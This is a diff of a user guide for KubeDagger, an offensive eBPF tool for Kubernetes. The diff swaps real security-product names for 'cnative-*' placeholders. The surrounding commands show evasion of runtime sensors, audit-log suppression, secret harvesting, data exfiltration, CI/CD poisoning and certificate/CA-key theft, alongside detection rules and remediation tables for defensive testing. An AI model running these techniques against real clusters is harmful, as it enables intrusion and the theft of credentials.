@@ -19,7 +19,7 @@
 - [Use Case 8: Service Mesh Security Validation](#use-case-8-service-mesh-security-validation)
 - [Use Case 9: Autonomous Objective Campaigns](#use-case-9-autonomous-objective-campaigns)
 - [Use Case 10: Cloud Provider Exploitation Testing](#use-case-10-cloud-provider-exploitation-testing)
-- [Use Case 11: CNCF Security Product Evasion Testing](#use-case-11-cncf-security-product-evasion-testing)
+- [Use Case 11: Cloud-Native Security Product Evasion Testing](#use-case-11-cloud-native-security-product-evasion-testing)
 - [Architecture Deep Dive](#architecture-deep-dive)
 - [MITRE ATT&CK Coverage](#mitre-attck-coverage)
 - [Deployment Scenarios](#deployment-scenarios)
@@ -43,7 +43,7 @@ KubeDagger is an eBPF-based offensive security research tool with a cross-platfo
 - Cloud provider exploitation (AWS, GCP, Azure)
 - CI/CD pipeline poisoning
 - Service mesh deep attacks
-- Adversarial evasion of CNCF security products (Tetragon, KubeArmor, Kubescape, Falco Talon, service mesh mTLS, cert-manager)
+- Adversarial evasion of cloud-native security products (cnative-probe, cnative-shield, cnative-audit, cnative-responder, cnative-mesh mTLS, cnative-certs)
 
 ---
 
@@ -201,8 +201,8 @@ agent-a1b2c3d4   linux   amd64   2s ago
   "kubedagger-client daemonset --action deploy --image kube-health:latest \
    --name kube-health --namespace kube-system"
 
-# Evade runtime security (Falco/Tetragon)
-./kubedagger-operator -key $KEY module agent-a1b2c3d4 cloud_evasion action=falco technique=symlink
+# Evade runtime security (cnative-sensor/cnative-probe)
+./kubedagger-operator -key $KEY module agent-a1b2c3d4 cloud_evasion action=cnative-sensor technique=symlink
 
 # Hide from audit logs
 ./kubedagger-operator -key $KEY module agent-a1b2c3d4 antiforensics action=suppress_audit pid=$$
@@ -236,7 +236,7 @@ Import the ATT&CK Navigator JSON layer to visualize coverage, then map each tech
 ## Use Case 2: Cloud-Native Security Assessment
 
 ### Scenario
-A security team needs to validate that their defense-in-depth controls actually work: network policies, pod security standards, runtime detection (Falco), image signing, and cloud IAM boundaries.
+A security team needs to validate that their defense-in-depth controls actually work: network policies, pod security standards, runtime detection (cnative-sensor), image signing, and cloud IAM boundaries.
 
 ### How-To: Validate Network Policy Enforcement
 
@@ -256,8 +256,8 @@ kubedagger-client netbypass --mode direct --dest-ip 10.0.5.3 --dest-port 443
 ### How-To: Validate Runtime Detection
 
 ```shell
-# Attempt to evade Falco
-kubedagger-client evasion --mode falco
+# Attempt to evade cnative-sensor
+kubedagger-client evasion --mode cnative-sensor
 
 # Verify if container escape is detected
 kubedagger-client escape --action execute --technique cgroup
@@ -267,14 +267,14 @@ kubedagger-client fs_watch add /etc/shadow --active
 ```
 
 **Assessment criteria:**
-- Did Falco generate an alert for each action?
+- Did cnative-sensor generate an alert for each action?
 - What was the detection latency?
 - Were any techniques completely invisible?
 
 ### How-To: Validate Image Signing
 
 ```shell
-# Attempt to bypass Sigstore/Cosign verification
+# Attempt to bypass cnative-signing verification
 kubedagger-client sig-bypass --mode inject-sig --target-image webapp:latest
 kubedagger-client sig-bypass --mode disable-verify --target-image api:v1
 ```
@@ -294,9 +294,9 @@ kubedagger-client cloud exfil --provider aws --bucket test-exfil \
 | Finding | Remediation |
 |---------|-------------|
 | IMDS accessible | Enable IMDSv2 with hop limit 1 |
-| Network policy bypass via XDP | Use CNI with XDP-level enforcement (Cilium) |
-| Falco evaded | Update rule sets, deploy kernel-level immutable sensors |
-| Image signing bypassed | Enforce OPA/Gatekeeper with image verification |
+| Network policy bypass via XDP | Use CNI with XDP-level enforcement (cnative-net) |
+| cnative-sensor evaded | Update rule sets, deploy kernel-level immutable sensors |
+| Image signing bypassed | Enforce cnative-authz with image verification |
 
 ---
 
@@ -309,7 +309,7 @@ A detection engineering team wants to create and validate detection rules for eB
 
 **Step 1: Set up a test cluster with observability**
 ```shell
-# Ensure Falco, Tetragon, or your SIEM agent is running
+# Ensure cnative-sensor, cnative-probe, or your SIEM agent is running
 # Deploy KubeDagger in the test cluster
 
 # Start the eBPF daemon
@@ -339,15 +339,15 @@ kubedagger-client webhook --action deploy --namespace default --image test:v1
 
 | KubeDagger Technique | Expected Detection Source | Detection Rule |
 |---------------------|--------------------------|----------------|
-| `syscall-bypass` | Falco (syscall monitor) | Anomalous getdents64 modifications |
+| `syscall-bypass` | cnative-sensor (syscall monitor) | Anomalous getdents64 modifications |
 | `dns_exfil` | DNS logs / SIEM | High-entropy subdomain queries |
-| `keyring --mode dump` | auditd / Tetragon | keyctl syscall from non-standard process |
-| `escape --technique privileged` | Falco | Container breakout via mount namespace |
+| `keyring --mode dump` | auditd / cnative-probe | keyctl syscall from non-standard process |
+| `escape --technique privileged` | cnative-sensor | Container breakout via mount namespace |
 | `webhook --action deploy` | K8s audit log | MutatingWebhookConfiguration creation |
 
 **Step 4: Write and validate detection rules**
 
-Example Falco rule for DNS exfiltration:
+Example cnative-sensor rule for DNS exfiltration:
 ```yaml
 - rule: Suspicious DNS Query Pattern
   desc: Detects base32-encoded subdomain labels typical of DNS exfiltration
@@ -466,7 +466,7 @@ kubedagger-client cri-tamper --runtime containerd --mode runc \
 ### How-To: GitOps Repository Poisoning
 
 ```shell
-# Target ArgoCD/Flux synced repositories
+# Target cnative-gitops/cnative-sync synced repositories
 kubedagger-client gitops-poison \
   --repo "https://github.com/org/infra" \
   --target-path "deployments/webapp.yaml" \
@@ -476,7 +476,7 @@ kubedagger-client gitops-poison \
 ### How-To: Image Signature Bypass
 
 ```shell
-# Bypass Cosign/Sigstore verification
+# Bypass cnative-signing verification
 kubedagger-client sig-bypass --mode inject-sig --target-image webapp:latest
 kubedagger-client sig-bypass --mode disable-verify --target-image api:v1
 ```
@@ -559,7 +559,7 @@ kubedagger-client container-log-c2 --container "api" --encode unicode
 ## Use Case 7: CI/CD Pipeline Security Testing
 
 ### Scenario
-Validate that CI/CD pipelines (Tekton, ArgoCD, Flux) are resistant to poisoning attacks that could inject malicious code into production deployments.
+Validate that CI/CD pipelines (cnative-pipeline, cnative-gitops, cnative-sync) are resistant to poisoning attacks that could inject malicious code into production deployments.
 
 ### How-To: Detect CI/CD Infrastructure
 
@@ -569,44 +569,44 @@ Validate that CI/CD pipelines (Tekton, ArgoCD, Flux) are resistant to poisoning 
 ```
 
 **What it finds:**
-- Tekton Pipelines installations and pipeline runs
-- ArgoCD applications and sync policies
-- Flux controllers and GitRepository sources
+- cnative-pipeline installations and pipeline runs
+- cnative-gitops applications and sync policies
+- cnative-sync controllers and GitRepository sources
 - Jenkins agents running in the cluster
 - GitHub Actions runners
 
-### How-To: Tekton Pipeline Injection
+### How-To: cnative-pipeline Pipeline Injection
 
 ```shell
-# Inject a malicious task into Tekton pipelines
+# Inject a malicious task into cnative-pipeline pipelines
 ./kubedagger-operator -key $KEY module agent-id cicd_poison \
-  action=inject platform=tekton namespace=tekton-pipelines
+  action=inject platform=cnative-pipeline namespace=cnative-pipeline-system
 ```
 
 **Attack flow:**
-1. Create a malicious Tekton Task that runs alongside legitimate build steps
+1. Create a malicious cnative-pipeline Task that runs alongside legitimate build steps
 2. The task exfiltrates source code, injects backdoors, or steals credentials
-3. Because it's a legitimate Tekton resource, it runs within the pipeline's RBAC context
+3. Because it's a legitimate cnative-pipeline resource, it runs within the pipeline's RBAC context
 
-### How-To: ArgoCD Application Poisoning
+### How-To: cnative-gitops Application Poisoning
 
 ```shell
-# Inject malicious sync into ArgoCD
+# Inject malicious sync into cnative-gitops
 ./kubedagger-operator -key $KEY module agent-id cicd_poison \
-  action=inject platform=argocd namespace=argocd
+  action=inject platform=cnative-gitops namespace=cnative-gitops
 ```
 
 **Attack flow:**
-1. Create/modify an ArgoCD Application pointing to an attacker-controlled repo
-2. ArgoCD automatically syncs the malicious manifests to the target cluster
-3. Resources deploy with ArgoCD's elevated permissions
+1. Create/modify a cnative-gitops Application pointing to an attacker-controlled repo
+2. cnative-gitops automatically syncs the malicious manifests to the target cluster
+3. Resources deploy with cnative-gitops' elevated permissions
 
-### How-To: Flux Source Manipulation
+### How-To: cnative-sync Source Manipulation
 
 ```shell
-# Manipulate Flux GitRepository sources
+# Manipulate cnative-sync GitRepository sources
 ./kubedagger-operator -key $KEY module agent-id cicd_poison \
-  action=inject platform=flux namespace=flux-system
+  action=inject platform=cnative-sync namespace=cnative-sync-system
 ```
 
 ### Defense Validation
@@ -614,7 +614,7 @@ Validate that CI/CD pipelines (Tekton, ArgoCD, Flux) are resistant to poisoning 
 | Control | Test | Pass Criteria |
 |---------|------|---------------|
 | Pipeline RBAC | Inject task with excess permissions | Task rejected by admission |
-| Source verification | Modify GitRepository URL | Flux rejects unsigned source |
+| Source verification | Modify GitRepository URL | cnative-sync rejects unsigned source |
 | Image policy | Deploy unsigned image via pipeline | Admission controller blocks |
 | Audit logging | Inject malicious resources | K8s audit captures creation events |
 | Network policy | Pipeline task exfiltrates data | Egress blocked by network policy |
@@ -624,7 +624,7 @@ Validate that CI/CD pipelines (Tekton, ArgoCD, Flux) are resistant to poisoning 
 ## Use Case 8: Service Mesh Security Validation
 
 ### Scenario
-Validate that service mesh (Istio, Linkerd) security controls — mTLS enforcement, authorization policies, and traffic management — cannot be bypassed.
+Validate that service mesh (cnative-mesh) security controls — mTLS enforcement, authorization policies, and traffic management — cannot be bypassed.
 
 ### How-To: Detect Service Mesh
 
@@ -634,8 +634,8 @@ Validate that service mesh (Istio, Linkerd) security controls — mTLS enforceme
 ```
 
 **What it finds:**
-- Istio control plane (istiod, pilot)
-- Envoy sidecar proxies
+- cnative-mesh control plane (mesh daemon, pilot)
+- cnative-mesh proxy sidecars
 - mTLS certificate authorities
 - Authorization policies in effect
 - Traffic management rules (VirtualServices, DestinationRules)
@@ -656,9 +656,9 @@ kubedagger-client meshbypass --mode raw --mesh-target 10.0.3.5:8080
 ### How-To: xDS Control Plane Injection
 
 ```shell
-# Inject malicious xDS configuration into Istio
+# Inject malicious xDS configuration into cnative-mesh
 ./kubedagger-operator -key $KEY module agent-id service_mesh \
-  action=xds_inject namespace=istio-system
+  action=xds_inject namespace=cnative-mesh-system
 ```
 
 **Impact:** Attacker-controlled routing rules direct traffic through a malicious proxy for interception.
@@ -666,9 +666,9 @@ kubedagger-client meshbypass --mode raw --mesh-target 10.0.3.5:8080
 ### How-To: Steal mTLS Certificates
 
 ```shell
-# Extract Istio mTLS certificates for impersonation
+# Extract cnative-mesh mTLS certificates for impersonation
 ./kubedagger-operator -key $KEY module agent-id service_mesh \
-  action=certs namespace=istio-system
+  action=certs namespace=cnative-mesh-system
 ```
 
 **Impact:** With stolen certificates, an attacker can impersonate any service in the mesh.
@@ -685,9 +685,9 @@ kubedagger-client meshbypass --mode raw --mesh-target 10.0.3.5:8080
 
 | Attack | Control | Expected Behavior |
 |--------|---------|-------------------|
-| XDP bypass | Cilium with XDP-level enforcement | Bypass fails |
+| XDP bypass | cnative-net with XDP-level enforcement | Bypass fails |
 | UID spoofing | Strict mTLS (STRICT mode) | Connection rejected without valid cert |
-| xDS injection | Istiod RBAC hardening | Unauthorized xDS push rejected |
+| xDS injection | cnative-mesh control plane RBAC hardening | Unauthorized xDS push rejected |
 | Cert theft | Short-lived certs (< 1h) + rotation | Stolen certs expire quickly |
 | Traffic hijack | AuthorizationPolicy (source principal) | Hijacked traffic rejected |
 
@@ -839,65 +839,65 @@ kubedagger-client cloud meta --provider azure
 
 ---
 
-## Use Case 11: CNCF Security Product Evasion Testing
+## Use Case 11: Cloud-Native Security Product Evasion Testing
 
 ### Scenario
-A security team deploys multiple CNCF security products (Tetragon, KubeArmor, Kubescape, Falco Talon) and wants to validate that these tools actually detect and prevent advanced adversarial techniques. This use case exercises the adversarial capabilities against each product to identify detection gaps and validate response effectiveness.
+A security team deploys multiple cloud-native security products (cnative-probe, cnative-shield, cnative-audit, cnative-responder) and wants to validate that these tools actually detect and prevent advanced adversarial techniques. This use case exercises the adversarial capabilities against each product to identify detection gaps and validate response effectiveness.
 
-### How-To: Tetragon eBPF Runtime Evasion
+### How-To: cnative-probe eBPF Runtime Evasion
 
 ```shell
-# Detect Tetragon deployment and version
-./kubedagger-operator -key $KEY module agent-id cloud_evasion action=tetragon technique=policy_gaps
+# Detect cnative-probe deployment and version
+./kubedagger-operator -key $KEY module agent-id cloud_evasion action=cnative-probe technique=policy_gaps
 
 # Bypass kprobe/tracepoint hooks via io_uring (syscalls not hooked by eBPF)
-./kubedagger-operator -key $KEY module agent-id cloud_evasion action=tetragon technique=io_uring
+./kubedagger-operator -key $KEY module agent-id cloud_evasion action=cnative-probe technique=io_uring
 
-# Overload Tetragon's perf ringbuffer causing event drops
-./kubedagger-operator -key $KEY module agent-id cloud_evasion action=tetragon technique=ringbuf_flood
+# Overload cnative-probe's perf ringbuffer causing event drops
+./kubedagger-operator -key $KEY module agent-id cloud_evasion action=cnative-probe technique=ringbuf_flood
 
 # Disable TracingPolicy CRDs to reduce monitoring scope
-./kubedagger-operator -key $KEY module agent-id cloud_evasion action=tetragon technique=disable_policy
+./kubedagger-operator -key $KEY module agent-id cloud_evasion action=cnative-probe technique=disable_policy
 ```
 
 **Assessment criteria:**
-- Did Tetragon detect the io_uring-based file/network operations?
+- Did cnative-probe detect the io_uring-based file/network operations?
 - Were ringbuffer overflow events logged or alerted?
 - Is TracingPolicy modification detected by audit logging?
 
-### How-To: KubeArmor LSM Enforcement Evasion
+### How-To: cnative-shield LSM Enforcement Evasion
 
 ```shell
-# Enumerate KubeArmor policies and find unconfined pods
-./kubedagger-operator -key $KEY module agent-id cloud_evasion action=kubearmor technique=policy_audit
-./kubedagger-operator -key $KEY module agent-id cloud_evasion action=kubearmor technique=unconfined
+# Enumerate cnative-shield policies and find unconfined pods
+./kubedagger-operator -key $KEY module agent-id cloud_evasion action=cnative-shield technique=policy_audit
+./kubedagger-operator -key $KEY module agent-id cloud_evasion action=cnative-shield technique=unconfined
 
 # Inject into an already-allowed process to bypass enforcement
-./kubedagger-operator -key $KEY module agent-id cloud_evasion action=kubearmor technique=process_inject
+./kubedagger-operator -key $KEY module agent-id cloud_evasion action=cnative-shield technique=process_inject
 
 # Deploy an allow-all policy to neutralize enforcement
-./kubedagger-operator -key $KEY module agent-id cloud_evasion action=kubearmor technique=allow_all
+./kubedagger-operator -key $KEY module agent-id cloud_evasion action=cnative-shield technique=allow_all
 ```
 
 **Assessment criteria:**
-- Are there pods without KubeArmor policy coverage?
-- Does KubeArmor detect process injection into allowed binaries?
-- Is unauthorized KubeArmorPolicy creation detected?
+- Are there pods without cnative-shield policy coverage?
+- Does cnative-shield detect process injection into allowed binaries?
+- Is unauthorized cnative-shield policy creation detected?
 
-### How-To: Kubescape Posture Evasion
+### How-To: cnative-audit Posture Evasion
 
 ```shell
 # Identify scan intervals and operate between them
-./kubedagger-operator -key $KEY module agent-id cloud_evasion action=kubescape technique=scan_timing
+./kubedagger-operator -key $KEY module agent-id cloud_evasion action=cnative-audit technique=scan_timing
 
 # Modify labels to match exclusion patterns
-./kubedagger-operator -key $KEY module agent-id cloud_evasion action=kubescape technique=label_exclusion
+./kubedagger-operator -key $KEY module agent-id cloud_evasion action=cnative-audit technique=label_exclusion
 
 # Suspend scan CronJobs to disable posture checks
-./kubedagger-operator -key $KEY module agent-id cloud_evasion action=kubescape technique=disable_scans
+./kubedagger-operator -key $KEY module agent-id cloud_evasion action=cnative-audit technique=disable_scans
 
-# Modify Kubescape configuration to exclude namespaces
-./kubedagger-operator -key $KEY module agent-id cloud_evasion action=kubescape technique=config_modify
+# Modify cnative-audit configuration to exclude namespaces
+./kubedagger-operator -key $KEY module agent-id cloud_evasion action=cnative-audit technique=config_modify
 ```
 
 **Assessment criteria:**
@@ -905,26 +905,26 @@ A security team deploys multiple CNCF security products (Tetragon, KubeArmor, Ku
 - Are excluded namespaces/labels audited?
 - Is CronJob suspension detected by monitoring?
 
-### How-To: Falco Talon Response Engine Evasion
+### How-To: cnative-responder Response Engine Evasion
 
 ```shell
 # Trigger decoy attacks to divert automated response
-./kubedagger-operator -key $KEY module agent-id cloud_evasion action=talon technique=decoy
+./kubedagger-operator -key $KEY module agent-id cloud_evasion action=cnative-responder technique=decoy
 
-# Saturate Falco's event pipeline to overwhelm Talon's input
-./kubedagger-operator -key $KEY module agent-id cloud_evasion action=talon technique=saturate
+# Saturate cnative-sensor's event pipeline to overwhelm cnative-responder's input
+./kubedagger-operator -key $KEY module agent-id cloud_evasion action=cnative-responder technique=saturate
 
-# Race against Talon's response cycle (act before response executes)
-./kubedagger-operator -key $KEY module agent-id cloud_evasion action=talon technique=response_race
+# Race against cnative-responder's response cycle (act before response executes)
+./kubedagger-operator -key $KEY module agent-id cloud_evasion action=cnative-responder technique=response_race
 
-# Modify Talon response rules via ConfigMap manipulation
-./kubedagger-operator -key $KEY module agent-id cloud_evasion action=talon technique=rule_modify
+# Modify cnative-responder response rules via ConfigMap manipulation
+./kubedagger-operator -key $KEY module agent-id cloud_evasion action=cnative-responder technique=rule_modify
 ```
 
 **Assessment criteria:**
-- Does Talon respond to decoys while the real attack proceeds?
-- Can event saturation cause Talon to drop legitimate alerts?
-- What is Talon's response latency (is a race viable)?
+- Does cnative-responder respond to decoys while the real attack proceeds?
+- Can event saturation cause cnative-responder to drop legitimate alerts?
+- What is cnative-responder's response latency (is a race viable)?
 
 ### How-To: Service Mesh Security Bypass
 
@@ -947,20 +947,20 @@ A security team deploys multiple CNCF security products (Tetragon, KubeArmor, Ku
 - Is the init container race window exploitable?
 - Are iptables modifications in sidecar-injected pods monitored?
 
-### How-To: cert-manager Exploitation
+### How-To: cnative-certs Exploitation
 
 ```shell
 # Enumerate all issuers and certificates in the cluster
-./kubedagger-operator -key $KEY module agent-id cloud_evasion action=certmanager technique=enumerate
+./kubedagger-operator -key $KEY module agent-id cloud_evasion action=cnative-certs technique=enumerate
 
 # Issue a certificate for arbitrary domains using cluster issuer
-./kubedagger-operator -key $KEY module agent-id cloud_evasion action=certmanager technique=issue_cert
+./kubedagger-operator -key $KEY module agent-id cloud_evasion action=cnative-certs technique=issue_cert
 
 # Steal CA private key from the issuer's secret
-./kubedagger-operator -key $KEY module agent-id cloud_evasion action=certmanager technique=steal_ca
+./kubedagger-operator -key $KEY module agent-id cloud_evasion action=cnative-certs technique=steal_ca
 
 # Prepare for man-in-the-middle attack using issued certificates
-./kubedagger-operator -key $KEY module agent-id cloud_evasion action=certmanager technique=mitm_prep
+./kubedagger-operator -key $KEY module agent-id cloud_evasion action=cnative-certs technique=mitm_prep
 ```
 
 **Assessment criteria:**
@@ -968,33 +968,33 @@ A security team deploys multiple CNCF security products (Tetragon, KubeArmor, Ku
 - Is unauthorized Certificate resource creation monitored?
 - Does mTLS rotation detect rogue certificates?
 
-### CNCF Security Validation Checklist
+### Cloud-Native Security Validation Checklist
 
-- [ ] Tetragon TracingPolicies cover io_uring syscalls (not just kprobes)
-- [ ] Tetragon ringbuffer size is adequate for burst traffic
-- [ ] KubeArmor policies cover ALL workload pods (no unconfined gaps)
-- [ ] KubeArmor detects process injection / path substitution
-- [ ] Kubescape scans run frequently enough (< 1 hour intervals)
-- [ ] Kubescape CronJob modifications trigger alerts
-- [ ] Falco Talon response latency is under 2 seconds
-- [ ] Falco pipeline handles burst event volume without drops
+- [ ] cnative-probe TracingPolicies cover io_uring syscalls (not just kprobes)
+- [ ] cnative-probe ringbuffer size is adequate for burst traffic
+- [ ] cnative-shield policies cover ALL workload pods (no unconfined gaps)
+- [ ] cnative-shield detects process injection / path substitution
+- [ ] cnative-audit scans run frequently enough (< 1 hour intervals)
+- [ ] cnative-audit CronJob modifications trigger alerts
+- [ ] cnative-responder response latency is under 2 seconds
+- [ ] cnative-sensor pipeline handles burst event volume without drops
 - [ ] Service mesh mTLS is STRICT mode (not PERMISSIVE)
 - [ ] Sidecar injection webhook has failurePolicy=Fail
-- [ ] cert-manager CA secrets are restricted by RBAC
+- [ ] cnative-certs CA secrets are restricted by RBAC
 - [ ] Certificate issuance is audited and anomalous domains alerted
 
 ### Remediation Guidance
 
 | Finding | Remediation |
 |---------|-------------|
-| io_uring bypasses Tetragon | Add io_uring_enter to TracingPolicy kprobe list |
+| io_uring bypasses cnative-probe | Add io_uring_enter to TracingPolicy kprobe list |
 | Ringbuffer overflow drops events | Increase perf_event_array size, enable event export to secondary sink |
-| Unconfined pods in KubeArmor | Deploy default-deny KubeArmorClusterPolicy |
-| Process injection undetected | Enable KubeArmor's process whitelisting with hash verification |
-| Long scan intervals (Kubescape) | Increase scan frequency, add admission-time scanning |
-| Talon response race viable | Reduce Talon polling interval, use synchronous admission webhooks |
+| Unconfined pods in cnative-shield | Deploy default-deny cnative-shield cluster policy |
+| Process injection undetected | Enable cnative-shield's process whitelisting with hash verification |
+| Long scan intervals (cnative-audit) | Increase scan frequency, add admission-time scanning |
+| cnative-responder response race viable | Reduce cnative-responder polling interval, use synchronous admission webhooks |
 | Host networking bypasses mesh | Enforce PodSecurity with restricted hostNetwork=false |
-| CA key accessible | Restrict cert-manager secrets to cert-manager namespace only |
+| CA key accessible | Restrict cnative-certs secrets to cnative-certs namespace only |
 
 ---
 
@@ -1178,8 +1178,8 @@ sudo ./bin/kubedagger -i eth0 -e eth0 --disable-bpf-obfuscation
 
 ```shell
 # Deploy in a monitored test cluster with:
-# - Falco running
-# - Tetragon running
+# - cnative-sensor running
+# - cnative-probe running
 # - K8s audit logging enabled
 # - SIEM collecting all logs
 
@@ -1188,7 +1188,7 @@ sudo ./bin/kubedagger -i eth0 -e eth0 --disable-bpf-obfuscation
 
 # Execute techniques one at a time, validating detection after each
 kubedagger-client escape --action detect
-# → Check: did Falco/Tetragon fire an alert?
+# → Check: did cnative-sensor/cnative-probe fire an alert?
 
 kubedagger-client secrets harvest --sources k8s
 # → Check: did the SIEM capture the secrets API call?
@@ -1293,7 +1293,7 @@ kubedagger-client daemonset --action deploy --image kubedagger:latest \
 ### Detection
 
 **Q: How do I test if my security tools can detect KubeDagger?**
-A: Run with `--disable-bpf-obfuscation` and execute techniques one by one. Check your security tooling (Falco, Tetragon, SIEM) for corresponding alerts after each technique.
+A: Run with `--disable-bpf-obfuscation` and execute techniques one by one. Check your security tooling (cnative-sensor, cnative-probe, SIEM) for corresponding alerts after each technique.
 
 **Q: What are the hardest techniques to detect?**
 A: Kernel-level techniques (BPF polymorphism, syscall hooking, XDP packet manipulation) are the hardest because they operate below most security tools. TCP window steganography and K8s Event C2 are extremely difficult to detect at the network level.
